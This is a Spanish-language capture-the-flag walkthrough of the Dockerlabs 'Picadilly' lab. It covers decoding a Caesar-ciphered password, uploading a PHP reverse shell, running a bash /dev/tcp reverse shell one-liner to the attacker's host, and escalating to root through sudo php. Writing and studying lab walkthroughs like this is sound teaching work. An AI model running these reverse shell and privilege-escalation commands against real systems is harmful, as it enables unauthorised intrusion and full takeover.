Desplegamos la máquina vulnerable poniendo en la terminal la línea de comandos **bash auto_deploy.sh picadilly.tar** en la carpeta donde se encuentre el contenido extraído del zip.<br>
<ins>La dirección IP de la máquina a vulnerar siempre es la 172.17.0.2</ins>.

  ![image](https://github.com/user-attachments/assets/4fc708f6-52c0-4b72-bfdb-ceb54a13b974)

Ahora, realizamos un escaneo de puertos de la máquina para revisar los puertos abiertos existentes y los posibles servicios a atacar mediante el uso de esos puertos.

  ![image](https://github.com/user-attachments/assets/1848f869-e579-4b05-a408-f0016fda72f0)

Podemos ver que se encuentran abiertos los puertos ***80*** y ***443***, correspondientes a los servicios ***HTTP*** y ***HTTPS***, respectivamente.

Nos dirigimos al navegador y en el buscador ponemos http://172.17.0.2:80.

  ![image](https://github.com/user-attachments/assets/19cd9d8c-2ce2-48e1-bf19-11f1ae5ef6ca)

Aparece un único archivo de texto llamado "**backup.txt**". Lo abrimos para ver su contenido:

  ![image](https://github.com/user-attachments/assets/dd609a1a-9ce1-41b8-9e2d-835f4f947e76)

Se nos muestra lo que parece ser un posible usuario del sistema (denominado "**mateo**") con una contraseña encriptada. A simple vista, no sabemos el lenguaje de encriptación que se ha empleado para la contraseña; pero si nos percatamos en la pista que se nos da, podemos saber que se trata del **Cifrado César**, por lo que ahora podemos decodear la clave.

Vamos a esta página de [Dcode.fr](https://www.dcode.fr/cifrado-cesar) y desciframos la contraseña:

  ![image](https://github.com/user-attachments/assets/3a30025a-6e89-461b-903f-2da3f9679db2)

La contraseña del usuario "mateo" parece ser "**easycrxazy**".

Buscamos en el navegador https://172.17.0.2:

  ![image](https://github.com/user-attachments/assets/361129e2-f551-454a-b9ac-6bc038d1487e)

Se nos muestra una página en la que podemos subir archivos en forma de publicaciones que se verán en la página web. Sabiendo esto, podemos ejecutar un **ataque LFI** (*Local File Inclusion*), subiendo un archivo PHP que contenga el código necesario para realizar una reverse shell.

  ![image](https://github.com/user-attachments/assets/6158f886-b498-4d5c-a5da-d19ccd9696fc)

Una vez subido, nos dirigimos al subdirectorio web "**/uploads**" y arrancamos la reverse shell:

  ![image](https://github.com/user-attachments/assets/66cc4112-4a36-4014-94ab-096264176e6d)

Nos ponemos con NetCat en escucha  por el puerto 443:

  ![image](https://github.com/user-attachments/assets/d7ed68d9-0802-42b3-8126-83d9a576b360)

  ![image](https://github.com/user-attachments/assets/088e4849-6e24-4d9b-b2e7-15c03ead370d)

Ahora escribimos en la terminal **bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"** para evitar que se nos cierre la sesión remota.

  ![image](https://github.com/user-attachments/assets/4c058228-cf0f-4a2b-a8a8-a3986e0bda67)

  ![image](https://github.com/user-attachments/assets/a3058931-03d9-476e-9c2d-98f2c1af319c)

Hemos accedido a la máquina víctima como el usuario *www-data*.

Luego, vamos a intentar acceder con las claves obtenidas al principio del laboratorio (***usuario: mateo, contraseña: easycrxazy***).

  ![image](https://github.com/user-attachments/assets/9ffa004c-0795-4b41-a4fb-465d2b9d7e1a)

Al ingresar las claves, desgraciadamente no conseguimos acceder a la terminal como este usuario. Probamos a eliminar la letra "x" siendo la contraseña ahora "**easycrazy**".

  ![image](https://github.com/user-attachments/assets/3a105af1-52e1-4e53-9e89-4f7de6cd6af8)

Ha funcionado, por lo que ahora somos el usuario "mateo".

Miramos con el comando **sudo -l** los archivos binarios que puede ejecutar el usuario actual de manera privilegiada.

  ![image](https://github.com/user-attachments/assets/0fbc1bff-61a7-45c3-9730-219feb908308)

El usuario puede ejecutar el binario /usr/bin/php como usuario root, sin necesidad de insertar su contraseña en la CLI.

Buscamos en [GTFOBins](https://gtfobins.github.io/) acerca del binario ***/usr/bin/php***.

  ![image](https://github.com/user-attachments/assets/fcd429c5-5897-4e17-8f67-c4bc669166cb)

**CMD="/bin/sh"<br>
sudo php -r "system('$CMD');"**

  ![image](https://github.com/user-attachments/assets/d8cc9951-70e1-4c1a-ab84-460ad0fb3850)

  ![image](https://github.com/user-attachments/assets/357c870d-d73a-4362-bd25-2eff328ed62e)

Finalmente, hemos conseguido acceder al sistema como el usuario root, por lo que ahora contamos con todos los privilegios existentes.

Una vez finalizamos con la máquina de Dockerlabs presionamos **Ctrl+C** para eliminarla.

  ![image](https://github.com/user-attachments/assets/135c993a-d599-4622-8f1e-1535c08ad8e3)

